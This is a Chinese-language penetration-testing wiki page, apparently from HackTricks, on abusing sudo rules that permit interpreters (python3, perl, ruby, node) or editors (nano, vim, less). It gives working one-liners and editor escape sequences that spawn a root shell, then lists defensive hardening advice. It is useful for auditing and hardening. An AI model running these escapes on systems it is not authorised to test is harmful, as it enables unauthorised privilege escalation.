# Sudo 命令滥用

{{#include ../../banners/hacktricks-training.md}}

## Sudo 允许的解释器

如果 `sudo -l` 允许用户以 root 身份运行解释器，应将其视为直接代码执行。解释器的设计目的就是执行任意代码，因此允许使用 `python3`、`perl`、`ruby`、`lua`、`node` 或类似二进制文件的规则，通常等同于允许执行 root 命令，除非参数受到严格限制并经过验证。

常见的审查流程：
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
其他解释器示例：
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
确切路径很重要。如果 sudo 规则允许使用 `/usr/bin/python3`，请在验证期间使用该确切路径：
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

如果 `sudo -l` 允许用户以 root 身份运行 interactive editor，应将其视为 command-execution surface，而不是无害的文件编辑权限。Editors 通常可以执行 shell 命令、读取任意文件、写入任意文件，或在 editor 内调用 external helpers。

常见的审查流程：
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

当允许通过 sudo 使用 `nano` 时，可以从编辑器界面执行命令：
```text
Ctrl+R
Ctrl+X
```
然后提供如下命令：
```bash
id
/bin/sh
```
在某些终端上，交互式 shell 可能需要重定向标准流：
```bash
reset; /bin/sh 1>&0 2>&0
```
具体的按键序列可能因 nano 版本和构建选项而有所不同，但安全问题是相同的：该编辑器以 root 身份运行，并且可以调用外部命令。

### 其他常见的 editor escape

Vim 风格的编辑器通常通过 `:!` 提供命令执行功能：
```text
:!/bin/sh
```
诸如 `less` 这样的 Pagers 也可能暴露 shell 执行功能：
```text
!/bin/sh
```
## 防御性说明

- 避免通过 sudo 授予解释器或交互式编辑器的访问权限。
- 优先使用由 root 所有、仅执行单一管理操作的固定 wrapper。
- 如果无法避免使用解释器，应限制确切的脚本路径，禁止用户控制参数、可写的 imports、`PYTHONPATH` 以及不安全的环境变量保留。
- 如果需要编辑文件，应限制确切的文件路径，并考虑使用 `sudoedit`，同时确保 sudo 版本已修补且严格处理环境变量。
- 检查 `SETENV`、`env_keep`、可写的工作目录、可写的模块/import 路径、`NOEXEC`、`use_pty` 以及 logging，但不要将它们视为完整的 sandbox。

{{#include ../../banners/hacktricks-training.md}}
